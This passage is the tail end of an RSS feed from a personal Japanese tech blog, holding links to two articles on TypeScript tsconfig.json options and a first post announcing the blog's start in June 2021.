&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://qiita.com/Nekonecode/items/09b26deec21a5f83adb1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;tsconfig.jsonのrootDirとbaseUrlに関するメモ [TypeScript]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://qiita.com/ryokkkke/items/390647a7c26933940470#rootdir&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;tsconfig.jsonの全オプションを理解する（随時追加中）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>ブログはじめました</title>
        <link>https://tadakun8.github.io/post/start-blog/</link>
        <pubDate>Tue, 08 Jun 2021 23:41:15 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/start-blog/</guid>
        <description>&lt;p&gt;はじまりはじまり&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
